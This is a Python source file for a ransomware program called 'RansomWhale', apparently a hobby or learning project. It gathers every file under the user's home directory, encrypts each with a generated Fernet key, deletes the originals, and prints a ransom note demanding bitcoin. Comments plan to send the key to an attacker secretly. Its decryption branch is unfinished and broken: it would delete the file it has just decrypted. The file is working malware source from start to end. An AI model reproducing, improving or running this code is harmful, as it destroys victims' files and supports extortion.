#### if there is a public.key file, read it, if it works, then decrypt the files
####       it will decrypt the public.key and use it to decrypt the files?
#### start off encrypting, send our key to the attacker somehow, secretly.
#### attacker has seperate program to make his key out of the victim's

#############[Packages]#############
###### cryptography package has our Fernet Symetric Encryption
######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
######    HMAC using SHA256 for authentication.
from cryptography.fernet import Fernet
import os
import glob #finds all the pathnames matching a specified pattern
####################################



############[Directory Setup]############
homeDir = os.path.expanduser('~') #grabs user home directory
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
#########################################



############[Targeting Files]############
file_list=[]
important = [] #where we store our key? work in progress
for filename in files:
    if "public.key" in filename:
        important.append(filename)
        print ("I see you have a public.key, let me validate that for you...")
   
    ## vvvvvvvvvvv below used to be an if statement right underneath for loop 
    elif "secret.key" not in filename and ".py" not in filename:    #testing, added secret.key, was just .key  #This makes sure we do not accidentally Encrypt our Key and Ransomware
        file_list.append(filename)
#########################################



############[Keygen]############        #need to find a way to send this to attacker
fern_key = Fernet.generate_key()
key = open("secret.key", "wb")
key.write(fern_key)
key.close()
fernet = Fernet(fern_key) #Supply Fernet with our Key,   need to send this to attacker somehow
################################



if len(important) == 0:  #if we dont see a public.key file, we want to encrypt all the files
    print("RansomWhale caught you!")
    ############[Encrypting Files]############
    for file in file_list:
        fileName = str(file)
        extension = os.path.splitext(file)[1]  #gets extension
    
        with open(file, 'rb') as f:
            f_bytes=f.read()
    
        f_bytes_encrypted = fernet.encrypt(f_bytes)
        print(f'RansomWhale was hungry and ate your file {file}')
        os.remove(file) #Removes our old unencrypted file
    
        fileExtension = '.RansomWhale.mp4'    #This is just for fun, adds a Custom Extension
        encFile = fileName + fileExtension  #Builds our Encrytped file with it's name + our Custom Extension
    
        with open(encFile, 'wb') as f:      
            f.write(f_bytes_encrypted)      #Writes the Encrypted bytes to our Encrypted file.
                                            # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
    ##########################################
    ransomNote="""
    Attention, your Personal Files have been Encrypted with a Government Grade Encryption System.
    Please upload a Maximum of 5 files per 1btc along with the [/app/secret.key] file 
    to our website www.uploaderwebsite.com along with your recepit.
    Thank you for your understanding.
    """
    print(ransomNote)
    
else:     #read the public.key, if it works, then decrypt the files
    print("test")   #ideally, the attacker encrypts the victims key, maybe with fernet, and then sends his key, which is the victims key encrypted by the attacker
                    #we will then decrypt attacker key to get our key back that we sent, and use that to decrpyt our files.
    #test
    ############[Decrypting key test]############
    for file in important:
        with open(file, 'rb') as f:
            f_bytes = f.read()
        
        f_bytes_decrypt = fernet.decrypt(f_bytes)
          
        with open(file,'wb') as f:
            f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
            os.remove(file)            #Removes the old encrypted file
##########################################